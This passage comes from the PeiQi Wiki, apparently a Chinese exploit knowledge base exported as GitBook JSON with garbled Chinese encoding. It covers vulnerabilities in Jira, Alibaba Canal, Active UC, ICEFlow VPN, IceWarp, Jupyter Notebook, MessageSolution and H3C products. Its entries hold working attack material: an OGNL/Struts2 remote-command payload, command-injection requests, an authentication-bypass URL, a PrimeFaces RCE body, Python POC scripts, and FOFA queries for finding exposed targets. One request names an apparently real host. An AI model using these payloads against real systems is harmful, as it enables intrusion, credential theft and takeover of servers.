http://xxx.xxx.xxx.xxx/secure/ViewUserHover.jspa?username=admin ç”¨æˆ·åå¦‚æœä¸å­˜åœ¨ä¼šè¿”å› å­˜åœ¨çš„ç”¨æˆ·åä¼šè¿”å› ä¸å­˜åœ¨æ¼æ´ä¼šè¿”å› æ¼æ´åˆ©ç”¨POC [!NOTE] POCåªç”¨äºæ¢æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´ çˆ†ç ´å¯ä½¿ç”¨: https://github.com/Rival420/CVE-2020-14181/blob/main/cve-2020-1481.py import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Atlassian Jira >> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/secure/ViewUserHover.jspa?username=peiqipeiqipeiqi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) version = re.findall(r'\\((.*?)#', response.text)[0] print(\"\\033[32m[o] ç›®æ ‡ Jira ç‰ˆæœ¬ä¸º{} \\033[0m\".format(version)) if \"peiqipeiqipeiqi\" in response.text: print(\"\\033[32m[o] ç›®æ ‡{}å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ç›®æ ‡ä¸å­˜åœ¨æ¼æ´ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ Atlassian_Jira_user_information_disclosure PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Alibaba Canal/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Alibaba Canal/","title":"Alibaba Canal","keywords":"","body":"Alibaba Canal Alibaba Canal config äº‘å¯†é’¥ä¿¡æ¯æ³„éœ²æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-03 15:15:46 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Alibaba Canal/Alibaba Canal config äº‘å¯†é’¥ä¿¡æ¯æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Alibaba Canal/Alibaba Canal config äº‘å¯†é’¥ä¿¡æ¯æ³„éœ²æ¼æ´.html","title":"Alibaba Canal config äº‘å¯†é’¥ä¿¡æ¯æ³„éœ²æ¼æ´","keywords":"","body":"Alibaba Canal config äº‘å¯†é’¥ä¿¡æ¯æ³„éœ²æ¼æ´ æ¼æ´æè¿° ç”±äº/api/v1/canal/config æœªè¿›è¡Œæƒé™éªŒè¯å¯ç›´æ¥è®¿é—®ï¼Œå¯¼è‡´è´¦æˆ·å¯†ç ã€accessKeyã€secretKeyç­‰ä¸€ç³»åˆ—æ•æ„Ÿä¿¡æ¯æ³„éœ² æ¼æ´å½±å“ [!NOTE] Alibaba Canal FOFA [!NOTE] title=\"Canal Admin\" æ¼æ´å¤ç° éªŒè¯æ¼æ´çš„Urlä¸º /api/v1/canal/config/1/0 å…¶ä¸­æ³„éœ²äº† aliyun.access å¯†é’¥ï¼Œå¯ä»¥æ§åˆ¶å¯†é’¥ä¸‹çš„æ‰€æœ‰æœåŠ¡å™¨ äº‘å¯†é’¥æ³„éœ²å‚è€ƒ: red.peiqi.tech å…¶ä¸­è¿˜å«æœ‰é»˜è®¤å£ä»¤ admin/123456 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Active UC/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Active UC/","title":"Active UC","keywords":"","body":"Active UC Active UC index.action è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-26 20:55:25 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Active UC/Active UC index.action è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Active UC/Active UC index.action è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"Active UC index.action è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"Active UC index.action è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° ç½‘åŠ¨ç»Ÿä¸€é€šä¿¡å¹³å° Active UC index.action å­˜åœ¨S2-045è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´, é€šè¿‡æ¼æ´å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ æ¼æ´å½±å“ [!NOTE] Active UC FOFA [!NOTE] title=\"ç½‘åŠ¨ç»Ÿä¸€é€šä¿¡å¹³å°(Active UC)\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å‘é€å¦‚ä¸‹è¯·æ±‚åŒ… POST /acenter/index.action HTTP/1.1 Cookie: SessionId=96F3F15432E0660E0654B1CE240C4C36 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Charsert: UTF-8 Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='dir').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}; boundary=---------------------------18012721719170 Cache-Control: no-cache Pragma: no-cache Host: Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive Content-Length: 196 -----------------------------18012721719170 Content-Disposition: form-data; name=\"pocfile\"; filename=\"text.txt\" Content-Type: text/plain xxxxxxx -----------------------------18012721719170 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-26 13:14:17 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ICEFlow/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ICEFlow/","title":"ICEFlow","keywords":"","body":"ICEFlow ICEFlow VPN ä¿¡æ¯æ³„éœ²æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-03 13:41:04 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ICEFlow/ICEFlow VPN ä¿¡æ¯æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/ICEFlow/ICEFlow VPN ä¿¡æ¯æ³„éœ²æ¼æ´.html","title":"ICEFlow VPN ä¿¡æ¯æ³„éœ²æ¼æ´","keywords":"","body":"ICEFlow VPN ä¿¡æ¯æ³„éœ²æ¼æ´ æ¼æ´æè¿° ICEFlow VPN å­˜åœ¨ä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æŸ¥çœ‹æ—¥å¿—ä¸­çš„æ•æ„Ÿæ•°æ®æ¥è¿›ä¸€æ­¥æ”»å‡»ç³»ç»Ÿ æ¼æ´å½±å“ [!NOTE] ICEFlow VPN FOFA [!NOTE] title=\"ICEFLOW VPN Router\" æ¼æ´å¤ç° å¯è®¿é—®çš„æ—¥å¿— Url ç³»ç»Ÿæ—¥å¿— http://url/log/system.log VPNæ—¥å¿— http://url/log/vpn.log è®¿é—®æ—¥å¿— http://url/log/access.log å‘Šè­¦æ—¥å¿— http://url/log/warn.log é”™è¯¯æ—¥å¿— http://url/log/error.log è°ƒè¯•æ—¥å¿— http://url/log1/debug.log ç§»åŠ¨ç”¨æˆ·æ—¥å¿— http://url/log/mobile.log é˜²ç«å¢™æ—¥å¿— http://url/log/firewall.log æ ¹æ®æ—¥å¿—ä¿¡æ¯è·å¾—sessionåï¼Œå¯åˆ©ç”¨å®æ—¶ç™»å½•ç³»ç»Ÿç®¡ç†åå°ï¼š http://xxx.xxx.xxx.xxx/cgi-bin/index?oid=10&session_id=xxxxxxxxxxxxxx&l=0 Goby & POC [!NOTE] ICEFlow VPN ä¿¡æ¯æ³„éœ²æ¼æ´ å‚è€ƒæ–‡ç«  https://www.uedbox.com/post/18720/ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/IceWarp/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/IceWarp/","title":"IceWarp","keywords":"","body":"IceWarp IceWarp WebClient basic è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-16 11:03:03 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/IceWarp/IceWarp WebClient basic è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/IceWarp/IceWarp WebClient basic è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"IceWarp WebClient basic è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"IceWarp WebClient basic è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° IceWarp WebClient å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ”»å‡»è€…æ„é€ ç‰¹æ®Šçš„è¯·æ±‚å³å¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œ æ¼æ´å½±å“ [!NOTE] IceWarp WebClient FOFA [!NOTE] app=\"IceWarp-å…¬å¸äº§å“\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ æ¼æ´è¯·æ±‚åŒ…ä¸º POST /webmail/basic/ HTTP/1.1 Host: sd.sahadharawat.com Content-Type: application/x-www-form-urlencoded Cookie: use_cookies=1 Content-Length: 43 _dlg[captcha][target]=system(\\'ipconfig\\')\\ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-16 11:13:03 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Jupyter Notebook/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Jupyter Notebook/","title":"Jupyter Notebook","keywords":"","body":"Jupyter Notebook æœªæˆæƒè®¿é—®è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ Jupyter Notebook æœªæˆæƒè®¿é—®è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-21 21:23:21 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Jupyter Notebook/Jupyter Notebook æœªæˆæƒè®¿é—®è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Jupyter Notebook/Jupyter Notebook æœªæˆæƒè®¿é—®è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"Jupyter Notebook æœªæˆæƒè®¿é—®è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"Jupyter Notebook æœªæˆæƒè®¿é—®è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° Jupyter Notebookï¼ˆæ­¤å‰è¢«ç§°ä¸º IPython notebookï¼‰æ˜¯ä¸€ä¸ªäº¤äº’å¼ç¬”è®°æœ¬ï¼Œæ”¯æŒè¿è¡Œ 40 å¤šç§ç¼–ç¨‹è¯­è¨€ã€‚ å¦‚æœç®¡ç†å‘˜æœªä¸ºJupyter Notebooké…ç½®å¯†ç ï¼Œå°†å¯¼è‡´æœªæˆæƒè®¿é—®æ¼æ´ï¼Œæ¸¸å®¢å¯åœ¨å…¶ä¸­åˆ›å»ºä¸€ä¸ªconsoleå¹¶æ‰§è¡Œä»»æ„Pythonä»£ç å’Œå‘½ä»¤ã€‚ æ¼æ´å½±å“ [!NOTE] Jupyter Notebook FOFA [!NOTE] app=\"Jupyter-Notebook\" && body=\"Terminal\" æ¼æ´å¤ç° è®¿é—®ç›®æ ‡, ç‚¹å‡» Terminal æ‰“å¼€å‘½ä»¤è¡Œç•Œé¢ æ‰§è¡Œå‘½ä»¤å¹¶åå¼¹shell PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/MessageSolution/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/MessageSolution/","title":"MessageSolution","keywords":"","body":"MessageSolution MessageSolution é‚®ä»¶å½’æ¡£ç³»ç»ŸEEA ä¿¡æ¯æ³„éœ²æ¼æ´ CNVD-2021-10543 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-22 13:41:52 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/MessageSolution/MessageSolution  é‚®ä»¶å½’æ¡£ç³»ç»ŸEEA ä¿¡æ¯æ³„éœ²æ¼æ´ CNVD-2021-10543.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/MessageSolution/MessageSolution  é‚®ä»¶å½’æ¡£ç³»ç»ŸEEA ä¿¡æ¯æ³„éœ²æ¼æ´ CNVD-2021-10543.html","title":"MessageSolution  é‚®ä»¶å½’æ¡£ç³»ç»ŸEEA ä¿¡æ¯æ³„éœ²æ¼æ´ CNVD-2021-10543","keywords":"","body":"MessageSolution é‚®ä»¶å½’æ¡£ç³»ç»ŸEEA ä¿¡æ¯æ³„éœ²æ¼æ´ CNVD-2021-10543 æ¼æ´æè¿° MessageSolutionä¼ä¸šé‚®ä»¶å½’æ¡£ç®¡ç†ç³»ç»Ÿ EEAæ˜¯åŒ—äº¬æ˜“è®¯æ€è¾¾ç§‘æŠ€å¼€å‘æœ‰é™å…¬å¸å¼€å‘çš„ä¸€æ¬¾é‚®ä»¶å½’æ¡£ç³»ç»Ÿã€‚è¯¥ç³»ç»Ÿå­˜åœ¨é€šç”¨WEBä¿¡æ¯æ³„æ¼ï¼Œæ³„éœ²WindowsæœåŠ¡å™¨administrator hashä¸webè´¦å·å¯†ç  æ¼æ´å½±å“ [!NOTE] MessageSolution ä¼ä¸šé‚®ä»¶å½’æ¡£ç®¡ç†ç³»ç»ŸEEA FOFA [!NOTE] title=\"MessageSolution Enterprise Email Archiving (EEA)\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ è®¿é—®å¦‚ä¸‹Url http://xxx.xxx.xxx.xxx/authenticationserverservlet/ ä½¿ç”¨è·å¾—åˆ°çš„å¯†ç å¯ä»¥ç™»å½•ç³»ç»Ÿ æ¼æ´åˆ©ç”¨POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: MessageSolution ä¼ä¸šé‚®ä»¶å½’æ¡£ç®¡ç†ç³»ç»ŸEEA \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/authenticationserverservlet/\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if response.status_code == 200 and \"administrator\" in response.text: print(\"\\033[32m[o] ç›®æ ‡ {} å­˜åœ¨ä¿¡æ¯æ³„éœ² å“åº”ä¸º:{}\\033[0m\".format(target_url, response.text)) else: print(\"\\033[31m[x] ç›®æ ‡ {}ä¸å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] ç›®æ ‡ {} è¯·æ±‚å¤±è´¥ \\033[0m\".format(target_url)) if __name__ == \"__main__\": title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] MessageSolution é‚®ä»¶å½’æ¡£ç³»ç»ŸEEA ä¿¡æ¯æ³„éœ²æ¼æ´ CNVD-2021-10543 Goby & POC å·²ç»æ›´æ–°åˆ° Githubä¸­ å‚è€ƒæ–‡ç«  https://mp.weixin.qq.com/s/jehAIIYWrpkLtGvGN-LtFA PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/H3C/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/H3C/","title":"H3C","keywords":"","body":"H3C H3C SecParhå ¡å’æœº get_detail_view.php ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-03 12:40:40 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/H3C/H3C SecParhå ¡å’æœº get_detail_view.php ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/H3C/H3C SecParhå ¡å’æœº get_detail_view.php ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´.html","title":"H3C SecParhå ¡å’æœº get_detail_view.php ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´","keywords":"","body":"H3C SecParhå ¡å’æœº get_detail_view.php ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´ æ¼æ´æè¿° H3C SecParhå ¡å’æœº get_detail_view.php å­˜åœ¨ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´ ä¸é½æ²»å ¡å’æœºå‡ºç°çš„æ¼æ´ç›¸ä¼¼ æ¼æ´å½±å“ [!NOTE] H3C SecParhå ¡å’æœº FOFA [!NOTE] app=\"H3C-SecPath-è¿ç»´å®¡è®¡ç³»ç»Ÿ\" && body=\"2018\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ POCéªŒè¯çš„Urlä¸º /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin æˆåŠŸè·å–adminæƒé™ Goby & POC PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-16 13:33:23 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/H3C/H3C SecParhå ¡å’æœº data_provider.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/H3C/H3C SecParhå ¡å’æœº data_provider.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"H3C SecParhå ¡å’æœº data_provider.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"H3C SecParhå ¡å’æœº data_provider.php è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° H3C SecParhå ¡å’æœº data_provider.php å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡ä»»æ„ç”¨æˆ·ç™»å½•æˆ–è€…è´¦å·å¯†ç è¿›å…¥åå°å°±å¯ä»¥æ„é€ ç‰¹æ®Šçš„è¯·æ±‚æ‰§è¡Œå‘½ä»¤ æ¼æ´å½±å“ [!NOTE] H3C SecParhå ¡å’æœº æ¼æ´å½±å“ [!NOTE] H3C SecParhå ¡å’æœº FOFA [!NOTE] app=\"H3C-SecPath-è¿ç»´å®¡è®¡ç³»ç»Ÿ\" && body=\"2018\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å…ˆé€šè¿‡ä»»æ„ç”¨æˆ·ç™»å½•è·å–Cookie /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin /audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-16 13:37:12 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/H3C/H3C IMC dynamiccontent.properties.xhtm è¿œç¨‹å‘½ä»¤æ‰§è¡Œ.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/H3C/H3C IMC dynamiccontent.properties.xhtm è¿œç¨‹å‘½ä»¤æ‰§è¡Œ.html","title":"H3C IMC dynamiccontent.properties.xhtm è¿œç¨‹å‘½ä»¤æ‰§è¡Œ","keywords":"","body":" æ¼æ´æè¿° H3C IMC dynamiccontent.properties.xhtm å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹æ®Šçš„è¯·æ±‚é€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œ æ¼æ´å½±å“ [!NOTE] H3C IMC FOFA [!NOTE] \"/imc/login.jsf\" && body=\"/imc/javax.faces.resource/images/login_help.png.jsf?ln=primefaces-imc-new-webui\" æ¼æ´å¤ç° ç™»å½•é¡µé¢ä¸º å‘é€å¦‚ä¸‹è¯·æ±‚åŒ… POST /imc/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1 Host: Connection: close Cache-Control: max-age=0 sec-ch-ua: \"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8 Cookie: oam.Flash.RENDERMAP.TOKEN=jw7ysel68; JSESSIONID=EB4E60FA4F333FF21B488E9937B4C739; currentThemeName=imc-new-webui Content-Type: application/x-www-form-urlencoded Content-Length: 1564 pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=whoami Goby & POC PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/JD-FreeFuck/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/JD-FreeFuck/","title":"JD-FreeFuck","keywords":"","body":"JD-FreeFuck JD-FreeFuck åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-29 20:59:26 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/JD-FreeFuck/JD-FreeFuck åå°å‘½ä»¤æ‰§è¡Œæ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/JD-FreeFuck/JD-FreeFuck åå°å‘½ä»¤æ‰§è¡Œæ¼æ´.html","title":"JD-FreeFuck åå°å‘½ä»¤æ‰§è¡Œæ¼æ´","keywords":"","body":"JD-FreeFuck åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ æ¼æ´æè¿° JD-FreeFuck å­˜åœ¨åå°å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œç”±äºä¼ 